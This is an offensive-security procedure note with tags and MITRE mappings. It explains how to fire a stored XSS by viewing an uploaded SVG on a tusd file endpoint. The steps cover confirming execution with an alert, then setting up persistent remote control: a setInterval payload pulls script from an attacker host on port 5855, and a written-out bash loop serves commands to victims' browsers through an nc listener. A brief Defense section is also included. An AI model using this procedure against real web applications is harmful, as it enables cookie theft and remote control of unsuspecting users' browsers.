---
tags:
  - xss
  - execution
  - compromise
type: procedure
tools:
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/alert-document-location]]'
  - '[[commands/setinterval-inject-script]]'
  - '[[commands/bash-loop-nc-listener]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 69bf90ae-a3a3-4fdb-9c53-eacfe527dffd
created_at: '2025-12-14T03:16:14.076Z'
updated_at: '2025-12-14T03:16:14.076Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-by-Viewing-Uploaded-SVG

## Summary

This procedure triggers the stored XSS by accessing the uploaded SVG link, executing the embedded JavaScript for DOM manipulation, cookie theft, or remote script injection, compromising visiting users.

## Description

When the SVG is served and rendered by the browser via the tusd endpoint, the embedded <script> tag executes in the context of the viewing page. This allows persistent attacks, such as alerting the location or periodically loading external scripts for interactive control, demonstrating full compromise potential.

## Requirements

1. Uploaded SVG file with link available
2. Browser to view the file
3. Optional: Attacker server on port 5855 for advanced payloads

## Defense

Defensive measures and detection strategies:

- Disable direct rendering of uploaded SVGs; serve as downloads
- Implement XSS filters and CSP headers on file view endpoints
- Monitor for anomalous JavaScript execution in browser consoles

## Objectives

1. Execute the payload to confirm XSS
2. Demonstrate impact like data exfiltration
3. Enable further compromise via remote injection

## Instructions

### Step 1: Access Uploaded File

**Context**: Click the link to render the SVG.

From the dashboard, click the file link.

> Browser requests and renders the SVG. Expected output: Visual shape appears, alert pops if using basic payload.

### Step 2: Verify Basic Execution

**Context**: Confirm JS runs with [[commands/alert-document-location]].

Observe the alert with document.location.

> Proves XSS. Expected output: Popup showing URL.

### Step 3: Advanced Payload and Listener

**Context**: For persistent compromise, use [[commands/setinterval-inject-script]] in SVG and start listener with [[commands/bash-loop-nc-listener]].

```bash
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

> Injects scripts every 100ms from //HOST:5855. Expected output: Remote commands executed in victim browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/alert-document-location]]
- [[commands/setinterval-inject-script]]
- [[commands/bash-loop-nc-listener]]

## Tools Used

- [[tools/nc]]

## Tags

- xss
- execution
- compromise
